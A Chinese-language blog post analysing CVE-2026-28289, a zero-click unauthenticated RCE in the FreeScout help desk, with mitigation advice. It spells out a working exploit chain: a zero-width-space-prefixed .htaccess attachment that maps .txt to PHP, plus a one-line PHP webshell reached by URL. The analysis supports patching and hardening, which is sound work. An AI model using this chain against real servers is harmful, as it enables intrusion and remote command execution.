#  “Mail2Shell”：FreeScout 零点击未认证 RCE（CVE‑2026‑28289）补丁绕过分析  
haidragon
                    haidragon  安全狗的自我修养   2026-03-12 04:33  
  
# 官网：http://securitytech.cc  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/R98u9GTbBntSoozVmQFwYnndJW8aToobPJNLk2xqbR4tvuCTCNDfibbWGMMjOypCKLotmW3ZOIibmibgps0OcDf8S7uAu618AdzpdKzKFrJaKA/640?wx_fmt=png&from=appmsg "")  
## Introduction（介绍）  
> 最近，来自 OX Research 的研究人员披露了一个影响开源工单系统 FreeScout 的严重漏洞。该漏洞将一个原本**需要认证的远程代码执行漏洞**  
升级为 **“零点击未认证远程代码执行（Zero‑Click Unauthenticated RCE）”**  
。  
  
  
该漏洞编号为：**CVE-2026-28289**  
  
攻击者只需 **发送一封特制的电子邮件**  
，就可以在服务器上执行任意命令。  
  
特点：  
- ❌ 不需要身份认证  
- ❌ 不需要用户点击  
- ❌ 不需要任何交互  
漏洞影响：  
- **FreeScout ≤ 1.8.206**  
修复版本：  
- **FreeScout 1.8.207**  
这项研究也说明了漏洞修复中的一个重要现实：  
> **补丁发布并不代表风险消失。攻击者往往会在补丁公开后的几个小时内分析补丁并寻找绕过方法。**  
  
# FreeScout 架构理解  
  
FreeScout 是一个 **基于 Laravel 的自托管 Help Desk 系统**  
，企业常用它来管理：  
- 客服工单  
- 共享邮箱  
- 客户支持请求  
典型部署架构：  
```
Internet
↓
MailServer(IMAP / POP3)
↓
FreeScoutMailFetcher
↓
AttachmentProcessing
↓
存储到/storage/attachments/
↓
通过Web界面访问
```  
  
FreeScout 会 **定期轮询配置的邮箱**  
，并自动导入：  
- 邮件内容  
- 邮件附件  
这种 **自动处理邮件附件的机制**  
，正是本次漏洞的核心攻击面。  
# 原始漏洞（旧版本 — 需要认证的 RCE）  
  
早期研究已经发现了一个 **需要登录权限的远程代码执行漏洞**  
。  
  
攻击链如下：  
```
已认证用户
↓
上传恶意附件
↓
文件存储到服务器
↓
WebServer执行文件
↓
远程代码执行
```  
  
随后，FreeScout 官方发布补丁，试图通过 **校验文件名与扩展名**  
 来阻止恶意文件上传。  
# 安全补丁逻辑  
  
补丁在文件处理 helper 中加入了扩展名检测。  
  
示例代码：  
```
$ext = strtolower(pathinfo($file_name, PATHINFO_EXTENSION));
```  
  
然后检测危险扩展名：  
```
if(preg_match('/('.implode('|',self::$restricted_extensions).')/', $ext)){
    $file_name = $file_name.'_';
}
```  
  
危险扩展名包括：  
```
php
phtml
phar
```  
  
如果检测到：  
```
shell.php
```  
  
系统会改名为：  
```
shell.php_
```  
  
这样 Web Server 就不会直接执行它。  
# 同时阻止 Dotfile  
  
补丁还尝试阻止 **dotfile**  
。  
  
例如：  
```
.htaccess
.user.ini
```  
  
这些文件非常危险，因为它们可以 **修改 Web Server 行为**  
。  
# 补丁绕过（Patch Bypass）  
  
在分析补丁时，OX Research 发现可以利用 **Unicode 字符绕过验证**  
。  
  
绕过字符：  
```
Zero‑WidthSpace
Unicode U+200B
```  
  
这个字符：  
- 在视觉上 **不可见**  
- 但在字符串中 **真实存在**  
# 恶意文件名示例  
  
攻击文件名：  
```
[U+200B].htaccess
```  
  
视觉效果：  
```
.htaccess
```  
  
实际内容：  
```
\u200b.htaccess
```  
# 为什么验证失败  
  
补丁使用以下代码判断文件是否以 .  
 开头：  
```
mb_substr($file_name,0,1)=='.'
```  
  
但是恶意文件名的 **第一个字符是**  
：  
```
U+200B
```  
  
因此系统看到的是：  
```
文件名以Unicode字符开头
```  
  
而不是：  
```
文件名以"."
```  
  
所以验证被绕过。  
# 后续处理阶段删除 Unicode  
  
在文件处理流程的后面阶段，系统会移除 Unicode 格式字符。  
  
代码：  
```
$file_name = preg_replace("#\p{Cf}+#u",'', $file_name);
```  
  
该逻辑会删除：  
```
U+200B
```  
  
因此文件名变成：  
```
\u200b.htaccess
```  
  
变为：  
```
.htaccess
```  
  
最终结果：  
  
✔ 成功在磁盘上写入 **真实 .htaccess 文件**  
  
绕过了之前的安全检查。  
# 完整利用流程  
  
攻击需要两个文件：  
```
.htaccess
webshell.txt
```  
## Step 1：上传恶意 .htaccess  
  
攻击者发送邮件附件：  
```
\u200b.htaccess
```  
  
内容示例：  
```
AddType application/x-httpd-php .txt
```  
  
作用：  
  
**让 Apache 将 .txt 文件当作 PHP 执行**  
## Step 2：上传 WebShell  
  
第二个附件：  
```
webshell.txt
```  
  
内容：  
```
PHP WebShell
```  
  
例如：  
```
<?php system($_GET['cmd']);?>
```  
  
当通过浏览器访问：  
```
https://target/storage/attachments/webshell.txt
```  
  
服务器就会执行：  
```
cmd=whoami
```  
  
从而实现 **远程命令执行**  
。  
# 推荐缓解措施  
  
组织应 **立即升级到：**  
```
FreeScout≥1.8.207
```  
  
同时建议进行以下安全加固。  
## 1 禁用 .htaccess  
  
Apache 配置：  
```
AllowOverrideNone
```  
## 2 禁止上传目录执行脚本  
  
例如：  
```
php_admin_flag engine off
```  
## 3 附件存储在 Web Root 外  
  
不要使用：  
```
/var/www/html/storage
```  
  
应该使用：  
```
/var/data/uploads
```  
## 4 监控异常文件  
  
安全团队应重点关注：  
```
.htaccess
*.php
*.phtml
```  
  
特别是在附件目录中。  
# 漏洞修复中的经验教训  
  
该漏洞体现了一个常见问题：  
```
发布补丁
↓
研究人员 diff 补丁
↓
发现新变种
↓
补丁被绕过
```  
  
攻击者通常会在补丁发布后 **立即分析代码差异**  
。  
  
如果：  
- 输入验证不完整  
- 清理顺序错误  
就可能被绕过。  
# 总结  
  
**CVE-2026-28289**  
 展示了漏洞如何在披露后迅速演变。  
  
原本：  
```
需要认证
```  
  
升级为：  
```
Zero‑Click未认证 RCE
```  
  
攻击面大幅扩大。  
  
所有运行 **FreeScout**  
 的组织应：  
- 立即更新  
- 加固上传目录  
- 审计邮件附件处理流程  
同时，安全团队需要认识到：  
> **仅仅打补丁是不够的，必须理解漏洞产生的根本机制。**  
  
- 公众号:安全狗的自我修养  
  
- vx:2207344074  
  
- http://  
gitee.com/haidragon  
  
- http://  
github.com/haidragon  
  
- bilibili:haidragonx  
  
- ![图片](https://mmbiz.qpic.cn/mmbiz_png/R98u9GTbBnuiaibO1fTN9fXrLc9IAFRQYyMfTVlwtvwcpo9lwRc34iceCuia3u5JhIEBhZMYsQZotU3ctPXJO4opaB0kLjSicFUicKwQqticT5ZQqM/640?wx_fmt=png&from=appmsg&watermark=1&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=1 "")  
  
##   
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/R98u9GTbBntJ8dGyXNWWGrwwtZc8qrQsBu4ibAORV7MjeLBRibkWE7mqAaBmfYbfblR69uhgF961SFWUOEbC4C6BcnPlDEx5TrAfYe8LmSkyk/640?wx_fmt=png&from=appmsg&watermark=1&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=7 "")  
  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/vBZcZNVQERHYgfyicoHWcBVxH85UOBNaPZeRlpCaIfwnM0IM4vnVugkAyDFJlhe1Rkalbz0a282U9iaVU12iaEiahw/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&randomid=z84f6pb5&tp=webp#imgIndex=5 "")  
  
****- ![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/vBZcZNVQERHYgfyicoHWcBVxH85UOBNaPMJPjIWnCTP3EjrhOXhJsryIkR34mCwqetPF7aRmbhnxBbiaicS0rwu6w/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&randomid=omk5zkfc&tp=webp#imgIndex=5 "")  
  
